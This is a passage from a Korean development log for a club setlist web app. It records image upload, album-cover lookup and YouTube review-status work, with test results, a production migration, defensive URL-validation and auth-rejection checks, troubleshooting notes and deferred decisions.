| F010 트리거 | **후보 조회 + 명시 반영** (자동 반영 아님, 곡 CRUD에 결합 안 함) | US 스토어프런트의 영문 표기 문제로 신뢰도 지표를 만들 수 없다. 벤치마크에서 1위 일치가 **48/64**로 나와, 자동 반영이었다면 **16곡에 잘못된 커버**가 쓰였을 것이 실측으로 확인됐다. 곡 CRUD에 붙이지 않은 것은 그쪽이 팀 행 잠금 트랜잭션 안이라 외부 호출을 넣으면 잠금을 쥔 채 최대 5초를 기다리기 때문 |
| 후보 수 | iTunes에 `limit=10` 요청 → 아트워크 base로 dedupe → **상위 5개** | 같은 앨범의 수록곡은 커버가 같아 dedupe로 뭉개진다. 5를 요청하면 dedupe 후 2~3개만 남는다 |
| 저장 URL 검증 | https + 호스트 allowlist + 경로 패턴 + 길이 255 | 프론트가 그대로 렌더링하는 값이다. allowlist는 `next.config.ts`의 remotePatterns와 같은 값으로 묶었다 — 다르면 `unoptimized`를 떼는 순간 이미지가 깨진다. **후보에 있었는지는 검증하지 않는다**(확인하려면 외부 호출을 한 번 더 하거나 상태를 저장해야 함) |
| 아웃바운드 상한 | 인메모리 슬라이딩 창 **15회/분** (Apple 안내 20보다 낮게) | 업스트림이 상한 초과 시 무엇을 돌려주는지 **확인하지 않았다**(확인하려면 의도적으로 한도를 넘겨야 한다). 그래서 우리 쪽에서 먼저 막는다. 슬롯은 **외부 호출 직전에만** 소모해, 잘못된 id로 인한 404가 예산을 갉아먹지 않게 했다 |

### 검증

**단위 테스트** — 이번 단계 신규 **185개 / 13파일**, 전체 **318개 / 22파일** 통과.
PrismaService·Storage 클라이언트·fetch만 대역으로 두고, 보상 삭제 3분기(P2025 / 재조회가 방금 올린 URL / 재조회 실패)와 시크릿 미유출(실패 4종 × `message`·`stack`·`cause`·자체 프로퍼티)을 고정했다. `team-card-image.pipeline.spec.ts`는 실제 Nest 앱을 띄워 **Guard가 인터셉터보다 먼저 실행되는지**를 직접 확인한다(미인증 + 1MB 초과 파일 → 413이 아니라 401, 저장소 호출 0회).

**스모크 체크** (읽기 전용) — 버킷 실제 스펙이 제안 스펙과 **4/4 일치**(`public=true`, `file_size_limit=2097152`, `allowed_mime_types` 3종). 인증 성공.

**쓰기 없는 런타임 검증** — **31/31 통과**, 실행 후 DB 스냅샷 diff **0**, 객체 목록 동일.

| 그룹 | 결과 |
| --- | --- |
| A. 인증 7종 (토큰 없음·Bearer 아님·위조·만료, 1MB 초과 파일 포함) | 전부 `401 인증이 필요합니다.` |
| B. `:id` 파싱 5종 (`abc`/`0`/`-1`) | 전부 `400 id는 1 이상의 정수여야 합니다.` |
| C. 404 3종 (없는 팀/곡, `P2025` 경로 포함) | 전부 404 |
| D. 파일 거부 7종 | 미첨부 400 · **1MB 초과 413** · SVG 400 · GIF 400 · 필드명 400 · 2파일 400 · 텍스트 혼입 400 |
| E. URL 거부 9종 | http·타호스트·**접미사 위장**·userinfo·100x100·쿼리스트링·상대경로·빈값·DTO 밖 필드 주입 전부 400 |

`PUT /teams/abc/card-image`에 파일을 첨부해 보내도 응답이 `id는 1 이상의 정수여야 합니다.`인 것을 확인했다 — 인터셉터가 다른 출처의 메시지를 덮지 않는다.

**F010 벤치마크** (읽기 전용, 실제 엔드포인트 경유, 4.5초 간격 = 13.3회/분, 5분 6초, iTunes 호출 64회, 429 0건)

| 구분 (dedupe 후 순위) | 건수 |
| --- | --- |
| **1위 일치** | **48 / 64** |
| 2~5위 | 5 |
| 후보에 없음 | 10 |
| 후보 0건 | 1 |
| 요청 실패 | 0 |

- **호스트 분포: `is1-ssl.mzstatic.com` 200건(100%)**, 다른 호스트 0건 → allowlist·`next.config.ts` 모두 변경 불필요
- **후보 URL 최대 165자**(기존 DB 최대 160자, 상한 255) → 상한 유지
- **경로 정규식에 거부되는 후보 0건.** 기존 `album` 63건과 합쳐 **실제 URL 263개 중 오거부 0건**
- 「후보 0건」 1건은 **id 50 `멋진헛간 / 오대천왕`**이다. 이 곡은 `album`이 레거시 상대경로(`/album-yeongdong-gayone.png`)인 유일한 행이기도 한데, iTunes가 결과를 0건으로 돌려줘 「기존값 비-iTunes」가 아니라 「후보 0건」으로 분류됐다. 동아리 자체 제작 곡으로 보이며 애플 카탈로그에 없다
- 「후보에 없음」 10건의 **원인은 이번에 조사하지 않았다.** 눈으로 본 범위에서는 (a) 같은 곡·같은 앨범인데 릴리스 에디션만 다른 경우(`Happy`/`sweet chaos`/`Congratulations` — Day6)와 (b) 1순위가 아예 다른 아티스트인 경우(`Back in Time / 너드커넥션` → `Run To the Sun / N.E.R.D`)가 섞여 있다. **`limit=10` + dedupe 5개 컷 때문에 잘렸을 가능성도 배제하지 못했다** — 확인하려면 limit을 늘려 재측정해야 한다

**쓰기 검증** — 임시 팀을 둘로 나눠 노출 창이 겹치지 않게 했다. **13/13 통과.**

| | 팀 A `__verify_a__` (id 21) | 팀 B `__verify_b__` (id 22) |
| --- | --- | --- |
| 보유 | 이미지만, 곡 0건 | 곡 1건 + 앨범 커버, `image_src` NULL |
| 노출 | 홈 캐러셀만 | `/event-goods` 2일차만 |
| 확인한 것 | DB 반영 · 객체 실재 · 공개 URL 200(`image/png`, `cache-control: public, max-age=31536000`) · 재업로드 시 새 경로 생성 + **이전 객체 보존** · 동시 업로드 2건에서 두 객체 모두 업로드되고 DB는 한쪽만 가리킴(고아 1개) · 고아 포함 전량 삭제 | `album` 반영 · 응답 일치 · **`title`/`singer` 미변경** · `image_src` NULL 유지 |

**실측 노출 창** (상한 60초를 두었으나 미발동)

| 페이지 | 구간 | 실측 |
| --- | --- | --- |
| 홈 | `15:48:50.765Z` → `15:48:52.029Z` | **1.3초** |
| `/event-goods` | `15:48:52.478Z` → `15:48:52.520Z` | **0.04초** |

**종료 상태**: `Line Up` 15행 / `Setlist` 64행 / `teamId` 매칭 **64/64** / DB 스냅샷 diff **0** / 버킷 객체 시작 0개 → 종료 **0개** / `day98` 잔존 **0건**. 공개 프론트가 쓰는 anon 키로도 다시 읽어 **15행·`day98` 0건**을 확인했다(관리자 키가 아니라 RLS가 적용되는 키 시점).

**소모된 id** (시퀀스는 되돌리지 않았다): `Line Up` **21·22** 2개(`setlist_id_seq` 20→22), `Setlist` **68** 1개(`Setlist_id_seq` 67→68).

**회귀 없음** — `apps/api`의 `build`·`lint`·`test`, 루트 `lint`·`build` 전부 통과.

### 트러블슈팅 기록

**1) 검증 스크립트가 `.env`를 서버와 다르게 해석했다**
`DATABASE_URL`을 정규식으로 직접 파싱하면서 값을 감싼 큰따옴표를 벗기지 못해 `getaddrinfo ENOTFOUND base`가 났다. 원인을 추측해서 고치지 않고 값을 출력하지 않는 진단(길이·따옴표 유무·`new URL()` 결과)으로 확인한 뒤, **Nest의 ConfigModule이 쓰는 dotenv를 그대로** 쓰도록 바꿨다. 같은 파일을 서버와 스크립트가 다르게 해석하면 검증 결과 자체를 믿을 수 없다.

**2) 슬라이딩 창 테스트가 실패했는데 구현이 아니라 테스트가 틀렸다**
두 호출을 **같은 시각에** 기록해 놓고 "하나만 만료되어야 한다"고 기대했다. 둘 다 같은 시각이니 함께 만료되는 게 맞다. 시각을 벌려서 고쳤고 구현은 손대지 않았다.

**3) `Buffer`를 fetch 본문으로 넘기면 타입이 맞지 않는다**
`Buffer<ArrayBufferLike>`가 `BodyInit`에 할당되지 않는다(백킹 버퍼가 `SharedArrayBuffer`일 수 있다고 보기 때문). 캐스팅으로 누르는 대신 `new Uint8Array(body)`로 한 번 복사해 타입을 정직하게 맞췄다 — 상한이 1MB라 비용이 무시할 수준이다.

**4) Windows에서 `process.exit()`가 종료 코드를 오염시켰다**
정리 스크립트가 pg 풀이 닫히는 중에 `process.exit()`를 불러 libuv 어서션(`UV_HANDLE_CLOSING`)이 나고 종료 코드가 127이 됐다. 출력은 전부 정상이었다. `process.exitCode`만 정해 두고 핸들이 정리되면 Node가 끝나게 바꿨다.

**5) 삭제한 객체가 CDN에서 계속 200으로 나온다 (설계 판단을 뒷받침한 관측)**
객체를 지운 직후, 그리고 약 1분 30초 뒤에도 공개 URL이 **`HTTP 200` + `cf-cache-status: HIT`** 로 이미지를 그대로 돌려줬다. 존재한 적 없는 경로는 `400` + `BYPASS`라, 200이 폴백이 아니라 **실제 캐시된 콘텐츠**임을 구분할 수 있었다.
이 프로젝트는 Storage의 `purgeCache`가 비활성이라 이 캐시를 비울 방법이 없다. 같은 경로를 덮어쓰는 설계였다면 **이미지를 교체해도 방문자는 한동안 옛 이미지를 본다.** 고유 파일명 + 이전 객체 보존을 택한 것이 이 관측으로 사후에 정당화됐다. 다만 **캐시가 실제로 며칠 남는지는 측정하지 않았다** — `max-age`가 1년이므로 길 가능성이 높다는 것만 안다.

### 이 단계에서 의도적으로 하지 않은 것

- **이미지 삭제 API** — 교체로 대응한다. 삭제 경로를 열면 "삭제 대상 계산이 틀려 살아 있는 이미지가 사라지는" 실패 모드가 생기는데, 그 대가가 보존의 대가(용량)보다 훨씬 크다
- **이미지 리사이즈·변환** — 서버에서 하지 않는다. Storage의 `imageTransformation`도 비활성이다. 상한 1MB로 충분히 눌린다
- **업로드 이미지의 비율·해상도 검증** — 매직바이트로 형식만 보고 크기 상한만 건다. 기존 15개가 전부 819×1024(4:5)인데 다른 비율이 올라오면 카드가 `object-cover`로 잘린다. 서버에서 막으면 관리자가 이유를 모른 채 거부당하므로 **7단계 관리자 UI에서 안내/크롭**으로 처리한다(§10에 기록)
- **고아 객체 정리 루틴** — 동시 업로드로 생기는 고아는 보존 정책상 정상이다. 쌓이는 속도가 문제가 되면 그때 만든다
- **곡 일괄 앨범 매칭** — work03. 지금 만들면 아웃바운드 상한 설계가 통째로 달라진다
- **유튜브 F011~F013 / `youtubeReviewStatus` 컬럼** — 6단계. §9·§10·§12에 이어 계속 보류. 컬럼만 먼저 만들면 아무도 읽지 않는 상태 값이 프로덕션 스키마에 남는다
- **인바운드 throttler / CORS** — 7단계. 이번에 만든 것은 **우리가 밖으로 내보내는** 호출의 상한이라 목적이 다르다
- **DB 마이그레이션** — 컬럼 추가가 없다. `image_src`와 `album` 모두 기존 컬럼을 그대로 쓴다
- **프론트 코드 수정** — `normalizeImageSource`가 https URL을 그대로 통과시켜 손댈 것이 없었다. `/event-goods` id 폴백 정리도 §10에 기록만 유지
- **엔드투엔드 로그인** — §10·§11·§12와 동일하게 관리자 비밀번호를 주고받지 않는 원칙에 따라 `JWT_SECRET`으로 로컬 서명한 토큰을 썼다. `POST /auth/login`을 통과하는 실제 자격증명 경로는 여전히 사용자 몫

### 남겨둔 결정 (6단계 이후로 이월)

- **「후보에 없음」 10건의 원인** — `limit`을 늘리면 줄어드는 문제인지, 검색어 가공(괄호·`feat.` 제거)이 필요한 문제인지 구분하지 못했다. 관리자 UI에서 실제로 불편한지 보고 판단한다
- **CDN 캐시 잔존 기간** — 삭제 후에도 캐시가 얼마나 남는지 측정하지 않았다. `max-age`가 1년이라 길 가능성이 높다. 이미지 삭제 기능이 필요해지는 시점에 다시 본다
- **`normalizeImageSource` 3중 복사본** — `setlist/page.tsx`·`event-goods/page.tsx`·`card-carousel.tsx`에 같은 로직이 세 벌 있다. 프론트 스코프라 이번에 손대지 않았고, 7단계에서 id 폴백을 정리할 때 함께 본다
- **아웃바운드 상한의 프로세스 지역성** — 인메모리라 인스턴스가 둘 이상이면 합산이 상한을 넘는다. 단일 상주 인스턴스 전제이며, 스케일아웃이 논의되는 시점에 공유 저장소 기반으로 옮긴다
- **BigInt 매퍼의 반복 비용** — §11·§12에서 이월한 항목 유지. 매퍼가 늘지는 않았다(기존 두 개를 재사용)

### 완료 상태 및 다음 단계

- 브랜치 `feature/card-image-album-cover` (`develop`에서 분기), 커밋 3개(F007 / F010 / 문서). 푸시·PR 보류
- **다음**: work02 빌드 순서 6단계 — 유튜브 배치 검색 + 리뷰용 엔드포인트(PRD F011~F013). 이번에 만든 아웃바운드 상한·타임아웃·실패 분류 구조를 그대로 재사용하되, 유튜브는 **일일 quota**가 있어 분당 상한만으로는 부족하다는 점이 다르다

## 14. work02-6a — 유튜브 검토 상태 컬럼 + URL 수동 수정(F013) 프로덕션 반영 (2026-09-20)

- **날짜**: 2026-09-20
- **브랜치**: `feature/youtube-review-status` (푸시/PR 생성은 보류)
- **커밋**: 컬럼 마이그레이션 `b86eee9` / F013 API `e990211` / 응답 계약 테스트 `748632d` / 롤백 문서 수정 `a3b78fb` / 교차 리뷰 반영(예약어 결함 수정 `3241064`, Prisma 고정 `5221446`, 롤백 문서 보강 `a12354f`) / 이 문서

### 배경

work02 빌드 순서 6단계를 둘로 나눈 것 중 1/2. `Setlist.youtubeReviewStatus`를 §9·§10·§12·§13에서 계속 미뤄 온 이유는 "컬럼만 먼저 만들면 아무도 읽지 않는 상태 값이 프로덕션 스키마에 남는다"였다. 이번에 **쓰는 쪽(F013 `PUT /songs/:id/youtube-url`)과 함께** 넣어 그 조건이 해소됐다. 배치 추천 검색·승인·반려(F011/F012)는 6단계 2/2.

### 기술 판단

| 항목 | 결정 | 이유 |
| --- | --- | --- |
| 타입 | `text + CHECK`가 아니라 **Postgres enum** | Prisma가 TS 유니온을 생성해 상태 전이 코드가 컴파일 타임에 검증된다. 값 추가는 `ALTER TYPE ADD VALUE`로 가능하지만(같은 트랜잭션에서 그 값을 쓰려면 별도 마이그레이션) 제거·개명은 어렵다 — PRD가 닫힌 집합으로 정의해 이 비용을 감수 |
| 불변식 | "approved면 URL 있음"을 **DB CHECK로 걸지 않음** | work03의 콘솔/CSV 대량 삽입은 기본값이 `pending`이라 URL이 있는 행도 `pending`으로 들어온다. CHECK가 있으면 그 삽입이 통째로 실패한다. 불변식은 서비스 코드가 지킨다 |
| 백필 | URL이 있는 행은 `approved` | 1학기에 사람이 확인해 넣은 값이라 `pending`으로 두면 2/2의 배치 재검색 대상에 잘못 포함된다 |
| 마이그레이션 원자성 | 파일 전문이 **하나의 암묵적 트랜잭션**으로 실행됨 | Prisma가 파일 전문을 한 문자열로 `apply_script`에 넘기고 quaint의 `raw_cmd`가 simple query를 쓰기 때문. 도중 실패하면 앞 문장까지 자동 롤백 → "컬럼만 생기고 백필이 빠진 상태"가 생기지 않는다 |
| `lock_timeout` | `SET LOCAL lock_timeout = '5s'` | 락 대기로 공개 프론트 조회가 밀리는 것을 막고, 못 잡으면 실패 후 재시도. 위 암묵적 트랜잭션 덕분에 `SET LOCAL`이 유효하고 블록이 끝나면 자동 원복 |
| 상태 전이 | F013은 현재 값과 무관하게 **항상 `approved`**, 상태는 요청 본문으로 받지 않음 | 사람이 직접 주소를 넣었다는 사실이 자동 추천 판단보다 우선. `rejected`는 "추천이 틀렸다"이지 "영상이 없다"가 아니라 교정 입력이 오면 되돌아와야 맞다. URL과 상태는 **한 번의 UPDATE**로 바꿔 사이 실패로 "URL은 있는데 `pending`"인 행이 생기지 않게 함 |

### 적용 절차와 결과 (프로덕션, `migrate deploy`, 2026-09-20 03:30:19 KST)

사전 확인은 코드로 단언했다: enum 값이 정확히 3개 · `SET LOCAL lock_timeout` 정확히 1회 · 폴더가 `20260919210000_resync_id_sequences` 뒤에 정렬. `DATABASE_URL`과 `DIRECT_URL`은 문자열이 동일(해시 일치)해서 `SET LOCAL`을 실측한 경로와 `migrate deploy`의 접속 경로가 같다.

| 단계 | 결과 |
| --- | --- |
| 사전 스냅샷 | `Setlist` 64행 × 6컬럼(신규 컬럼 제외) / `Line Up` 15행 / 시퀀스 3개 / 적용 이력 4개 |
| 드라이런 (`BEGIN … ROLLBACK`) | 트랜잭션 안에서 분포 `approved 5 / pending 59`, `lock_timeout=5s`, enum `{pending,approved,rejected}`. **ROLLBACK 후 컬럼·타입 잔존 0, 세션 `lock_timeout`은 `0`으로 원복, 스냅샷 diff 0** |
| `prisma migrate deploy` | 성공, 에러 없음 |
| 분포 | `approved 5`(전부 URL 보유) / `pending 59`(전부 URL 없음) |
| 기존 컬럼 diff | `Setlist` **0** / `Line Up` **0** / 시퀀스 **무변화** |
| 컬럼 정의 | `NOT NULL DEFAULT 'pending'`, 타입 `youtube_review_status` |
| `migrate status` | `Database schema is up to date!` (마이그레이션 5개) |
| `migrate diff --exit-code` | `No difference detected.` (exit 0) |
| anon 키 조회 | `Setlist` 64행 HTTP 200, 새 컬럼 포함 |
| 보안 린터 | **ERROR 0**. INFO 2건은 `AdminUser`·`_prisma_migrations`의 의도된 RLS 전체 차단 |

**공개 노출 참고**: RLS가 행 단위 SELECT라 anon 키로도 `youtube_review_status`가 조회된다. 프론트는 `select("*")`로 받지만 `src` 어디서도 참조하지 않아 화면에는 영향이 없다. 검토 상태가 비공개여야 하는 요구가 생기면 컬럼 권한이나 뷰로 가려야 한다(지금은 요구 없음).

### 런타임 검증

인증은 §10~§13과 같은 방식이다 — 관리자 비밀번호를 주고받지 않으므로 `JWT_SECRET`으로 **로컬 서명한 토큰**을 썼다. `POST /auth/login`을 통과하는 실제 자격증명 경로는 여전히 사용자 몫.

**쓰기 없는 검증** — 26건 통과 + 경계값 2건 통과, 실행 후 `Setlist` **전 컬럼(상태 포함) 스냅샷 diff 0**. URL 거부 케이스는 검증이 뚫려도 행이 바뀔 수 없도록 **존재하지 않는 id**에만 보냈다.

| 그룹 | 결과 |
| --- | --- |
| 인증 4종 (토큰 없음·Bearer 아님·위조·만료) | 전부 `401 인증이 필요합니다.` |
| `:id` 파싱 (`abc`/`0`/`-1`) | 전부 `400 id는 1 이상의 정수여야 합니다.` |
| 없는 곡 | 404 |
| URL 거부 11종 (http·타 호스트·**접미사 위장**·userinfo·재생목록·채널·ID 형식 오류·`v` 중복·스킴 누락·빈값·`javascript:`) | 전부 400 |
| 본문 검증 4종 (`youtubeReviewStatus`/`title` 주입·`url` 누락·숫자 타입) | 전부 400 |
| 정상 변형 3종 (`youtu.be?si=`·`/shorts/`·`list`+`t` 파라미터) | 검증 통과(없는 id라 404) |
| 길이 경계 | 512자 통과 / 513자 거부 |

**쓰기 검증** — 임시 곡 1건, 스크립트 1회, 17건 통과.

| | 확인한 것 |
| --- | --- |
| 생성 | 새 곡의 상태가 DB 기본값 `pending`, URL·앨범 NULL |
| `pending → approved` | `youtu.be/<id>?si=…&t=30s`가 `https://www.youtube.com/watch?v=<id>`로 **정규화**돼 저장, 응답 키가 계약(7개)과 정확히 일치, `title`/`singer`/`album` 미변경 |
| 멱등 | 같은 URL 재입력도 200 · `approved` |
| **`rejected` 저장** | 임시 곡에 한해 SQL로 `rejected` 세팅 → DB에 실제로 저장됨을 확인 (**enum 3번째 값이 프로덕션에 실재**). 조회 API도 `rejected`·URL null을 그대로 노출 |
| `rejected → approved` | 다른 영상(`/shorts/<id>`)으로 교정 → 200 · `approved` · 정규화 URL |
| 검증 실패는 상태 불변 | `rejected` 상태에서 http URL → 400, 상태/URL 불변. 본문에 `youtubeReviewStatus` 주입 → 400, 상태 불변 |

- 임시 곡의 URL은 **사이트가 이미 노출 중인 기존 영상 ID**만 사용했다 (신규 외부 영상 노출 없음)
- **실측 노출 창 0.15초** (곡 생성 응답 `18:38:05.786Z` → 삭제 `18:38:05.940Z`). 노출 경로는 곡 생성 직전에 코드 근거와 함께 로그에 남겼다: `/event-goods`(day98은 id 폴백으로 2일차 분류, `tracks.length>0` 통과)만 해당하고, `/setlist`(`id<=14` 상한)·홈 캐러셀(`image_src` 비면 제외)은 미노출
- 실제 곡은 한 건도 건드리지 않았다. 임시 팀은 `day98`/`__verify__`, 곡은 `__verify_song__`

**종료 상태** (독립 정리 스크립트): `day98`·임시 곡 잔존 **0** / `Line Up` **15행** / `Setlist` **64행** / `teamId` 매칭 **64/64** / 분포 `approved 5 / pending 59` / 기존 컬럼 스냅샷 diff **0**.

**소모된 id** (시퀀스는 되돌리지 않았다): `Line Up` **23** 1개(`setlist_id_seq` 22→23), `Setlist` **69** 1개(`Setlist_id_seq` 68→69).

**회귀 없음** — `apps/api` `npm test` **431개 / 27파일** 통과, `npm run lint`·`npm run build` 통과.

### 롤백 문서 수정

`prisma/rollback/20260920120000_add_youtube_review_status.rollback.sql`의 "성공으로 기록된 경우" 처리를 고쳤다. 기존에는 `_prisma_migrations` 행 `DELETE`를 안내했는데, **머지된 뒤에는 이력을 조작하지 않는 것이 맞다** — 다른 클론/CI에 남은 폴더·이력과 어긋나 드리프트가 생기고 이력이 조용히 거짓이 된다. 우선안을 **정방향 새 마이그레이션(`DROP COLUMN`/`DROP TYPE`)** 으로 바꾸고, `DELETE`는 **머지 전에 브랜치 자체를 폐기할 때만** 가능하다고 명시했다. 안전 기간(2/2가 이 컬럼에 쓰기 시작하기 전까지)은 그대로다.

### 트러블슈팅 기록

**1) 검증 스크립트의 길이 상한 가정이 틀렸다 (앱이 아니라 테스트의 오류)**
"255자 초과" 케이스가 400이 아니라 404였다. 앨범 커버의 상한(255)을 그대로 가져온 가정이었고, 유튜브 URL의 실제 상한은 **512**(`youtube.constants.ts`)다. 344자짜리 입력은 상한 안이라 검증을 통과해 404가 나온 것이 맞다. 코드에서 실제 상한을 확인한 뒤 경계값(512 통과 / 513 거부)으로 다시 검증했다. 구현은 손대지 않았다.

**2) 쉘 `&`로 띄운 서버가 로그 없이 떠 있었다**
8초 뒤 `health`가 실패해 서버가 안 뜬 줄 알고 다시 띄웠더니 `EADDRINUSE`가 났다. 첫 서버가 단지 느리게 뜬 것이었다. 포트를 잡은 프로세스의 **시작 시각이 빌드 산출물 시각 직후**임을 확인해 내가 띄운 서버임을 검증한 뒤 그대로 사용했고, 검증 후 종료했다.

### 이 단계에서 의도적으로 하지 않은 것

- **배치 추천 검색·승인·반려(F011/F012)** — 6단계 2/2. YouTube Data API의 **일일 quota** 관리가 필요해 모듈을 분리해 두었다
- **`DB CHECK`("approved면 URL 있음")** — 위 기술 판단 참조. work03의 대량 삽입과 충돌
- **엔드투엔드 로그인** — §10~§13과 같은 원칙
- **프론트 코드 수정** — 새 컬럼을 화면에서 쓰지 않는다

### 교차 리뷰 반영 (2026-09-20)

구현자와 다른 세션이 `git diff develop...HEAD`를 읽고 "구현자가 확인하지 않았을 가정"만 지적하게 했다. 코드는 고치지 않는 조건이었다.

**발견 경위 — 예약어 결함**: 리뷰어가 파서를 코드로만 읽지 않고 `youtube-url.ts` 로직을 그대로 옮긴 관찰용 스크립트에 우회 후보(userinfo·유사 도메인·IDN·퍼센트 인코딩·백슬래시·대소문자·`v` 중복)를 넣어 실측했다. 호스트 allowlist 우회는 없었지만, 시도 목록에 없던 곳에서 결함이 나왔다 — `/embed/videoseries`와 `/embed/live_stream`이 통과해 `watch?v=videoseries`·`watch?v=live_stream`으로 **approved 저장**됐다. 두 토큰이 정확히 11자라 `[A-Za-z0-9_-]{11}`에 맞는다.

**왜 구현 단계에서 못 잡았나**: 검증이 "ID처럼 생겼는가"(형식)만 봤고 "ID가 맞는가"(의미)는 보지 않았다. 테스트도 실제 5건과 같은 모양의 ID만 넣어서 ID 자리에 다른 종류의 값이 올 수 있다는 가정을 한 번도 깨 보지 못했다. 구현자 스스로 "형식 검증만 통과하면 영상이 존재한다"고 가정했다.

**수정** (`3241064`): ID 자리의 값이 예약어이면 경로 형태와 무관하게(`embed`/`shorts`/`live`/`watch?v=`/`youtu.be`) 거부한다. `videoseries`는 `PLAYLIST`, `live_stream`은 `NOT_A_VIDEO` 사유를 재사용했다 — "영상 ID는 11자여야 합니다"라는 `INVALID_VIDEO_ID` 문구는 11자짜리 값에 모순되므로 쓰지 않았다. 새 사유를 추가하지 않아 서로 다른 안내 문구 테스트(4종)는 그대로다. 예약어 조회는 `Map` 정확 일치이며(`constructor`도 11자라 객체 리터럴이면 오인된다) 테스트로 고정했다. **수정 전 코드에서 새 테스트 12건이 실패하는 것을 확인했다.** 추측: 이 둘 외에 ID 자리를 차지하는 11자 토큰이 더 있는지는 확인하지 못했다(`youtube.constants.ts`에 발견 시 추가하도록 남김).

**프로덕션 영향 없음 확인** (읽기 전용 SELECT, 수정 없음): `youtube_url`이 NULL이 아닌 행은 **정확히 id 27·30·59·62·63의 5건**이고 값은 기존과 동일했다(테스트의 `REAL_URLS`와 대조). 분포 `approved 5(URL 5) / pending 59(URL 0)`, 전체 64행, `videoseries`/`live_stream`을 담은 행 **0건**. 결함이 있던 코드가 프로덕션 데이터에 닿은 적이 없다(F013 검증에 쓴 임시 곡은 정상 ID만 사용했고 삭제됨). 확인에 쓴 DB 연결이 프로덕션이라는 근거는 행 수·분포·id·값이 위 §14 기록과 모두 일치한다는 것뿐이다(추론).

**그 밖에 반영한 것**
- 죽은 테스트(56행과 같은 입력을 되풀이하던 "경로 대문자는 유지")를 ID 대소문자 보존 검증으로 교체, `watch?v=approved` 픽스처(8자, 상태 이름과 혼동)를 유효한 11자 ID로 교체
- WHATWG `URL`이 조용히 받아 주는 변형(백슬래시, 단일 슬래시, `https:host`, 전각 호스트, 퍼센트 인코딩 호스트)의 현재 동작을 회귀 테스트로 고정. 전부 저장값을 상수 호스트로 새로 만들기 때문에 통과해도 무해하며, 고정한 이유는 Node/ICU 변경 시 먼저 알아채기 위해서다(관찰: Node v24.12.0)
- `normalizeYoutubeUrl`은 프로덕션에서 쓰이지 않는 **테스트 전용 진입점**임을 코드 주석으로 명시(서비스는 사유 로깅 때문에 `checkYoutubeUrl`을 직접 호출)
- 스펙이 타입검사되지 않아 가려져 있던 이 브랜치의 픽스처 타입 오류 4건 수정(`SongRow`의 `youtubeReviewStatus` 누락 3건, `it.each` 인자 1건). 타입 검사 자체의 공백은 §10에 기록
- `prisma`·`@prisma/client`·`@prisma/adapter-pg`를 `^7.10.0`에서 **`7.10.0`으로 고정**(`5221446`) — 마이그레이션 원자성과 `SET LOCAL` 유효성 결론이 Prisma schema-engine의 `apply_script` 구현에 의존하므로 범위 승급으로 그 전제가 조용히 바뀌지 않게 한다. 업그레이드 시 원자성 결론을 다시 검증한다. 설치본·락파일은 이미 7.10.0이었다
- 롤백 문서(`a12354f`): 순서를 "코드 되돌리기/배포 중지 → DB DROP"으로, `--rolled-back` 전에 실제 스키마 상태를 확인하는 절차와 "스키마는 커밋됐는데 성공 기록만 없는" 어긋남 경로(유지하면 스키마 검증 후 `--applied`, 되돌리면 DROP 후 처리) 추가, DROP에 `lock_timeout` 추가, 1)·(가) 모순 정리. 이미 적용된 `migration.sql`은 체크섬 때문에 수정하지 않았다

**이번에 반영하지 않은 지적** (심각도 낮음, 필요해지면 다룬다)
- 백필의 `btrim`이 공백만 자르고 URL 형식은 검증하지 않음 — 적용된 마이그레이션이라 수정 불가하며, 프로덕션 5건은 위 확인으로 정상
- 허용 호스트인데 `NOT_YOUTUBE`로 안내되는 경우(`:8443`, userinfo), 스킴 없는 `youtube.com:443/…`이 `MALFORMED`로 분류되는 안내 문구 부정확
- 서비스 스펙의 `toEqual`(키 누락에 관대). 계약은 `song-response.spec.ts`의 `toStrictEqual`이 고정한다

### 남겨둔 결정과 알려진 한계 (2/2 및 work03으로 이월)

이 단계 작업을 마치며 확인된, 지금은 고치지 않지만 **다음 사람이 모르면 사고가 되는** 항목이다.

| 항목 | 내용 | 처리 시점 |
| --- | --- | --- |
| 곡 `title`/`singer` 수정 시 검토 상태 재설정 여부 | §12 4단계 결정(수정해도 `youtubeUrl` **유지**)에 따라, 곡을 **다른 곡으로 교체하는 수정**을 해도 `approved`가 그대로 남는다. 상태가 `approved`이면 2/2 배치 재검색 대상에서 빠지므로, 교체된 곡에 **이전 곡의 영상이 승인 상태로 남아** 재검토되지 않는다. 오타 교정과 곡 교체를 API가 구분하지 못하는 §12의 문제가 검토 상태까지 번진 것이다 | **2/2 설계 항목** — 수정 시 `pending`으로 되돌릴지, 되돌린다면 오타 교정도 재검토 대상이 되는 비용을 감수할지 함께 결정 |
| URL 제거(null) 불가 | F013은 **교체만** 가능하다. 잘못 승인된 URL을 "영상 없음"으로 되돌리는 경로가 없다(`rejected`도 F013이 만들 수 없고 2/2의 F012 반려 경로에서만 생긴다). 본문 검증이 빈 값을 400으로 거부하는 것이 이 한계의 직접 원인이다 | 2/2에서 반려(F012)가 URL을 비우는지 결정할 때 함께 정리. 그 전까지는 SQL로만 가능 |
| work03 대량 삽입 후 `approved` 갱신 | 위 기술 판단의 "DB CHECK를 걸지 않음"의 반대편 비용이다. 콘솔/CSV 대량 삽입은 컬럼 기본값이 `pending`이라 **`youtube_url`이 있는 행도 `pending`으로 들어온다.** 그대로 두면 2/2의 배치 재검색이 **이미 사람이 확인한 링크를 덮어쓰려 한다.** 삽입 직후 `youtube_url IS NOT NULL`인 행을 `approved`로 갱신하는 단계가 필요하다 (§11 시퀀스 재동기화와 같은 "삽입 뒤 후처리" 목록에 넣는다) | work03-A 데이터 반영 시점 |

> **§15에서 처리한 결과 (2026-09-20)**: 위 표의 이월 항목은 6단계 2/2에서 이렇게 정리됐다.
> - **곡 `title`/`singer` 수정 시 검토 상태** → 정규화 비교로 **실제 변경일 때만 `pending`으로 되돌리고 URL은 유지**, 열린 추천은 닫고 이력은 무효화한다
> - **URL 제거(null)** → **허용하지 않기로 결정**(반려는 `url IS NULL`인 곡에만 일어나 비울 것이 없다)
> - **`youtube_url` 형식 DB CHECK** → **걸지 않기로 결정**. 대신 work03 대량 삽입 시 형식 검증을 §10의 삽입 후처리 목록에 추가했다
> - **work03 대량 삽입 후 `approved` 갱신** → 여전히 work03-A 시점의 필수 후처리다

### 완료 상태 및 다음 단계

- 브랜치 `feature/youtube-review-status`, 푸시·PR 보류

- **다음**: 6단계 2/2 — 배치 추천 검색 + 리뷰용 엔드포인트(F011/F012). 이번에 만든 `pending`/`rejected`가 그 대상 선별 기준이 된다

## 15. work02-6b — 유튜브 배치 추천 검색(F011) + 추천 리뷰 승인/반려(F012) (2026-09-20)

- **날짜**: 2026-09-20
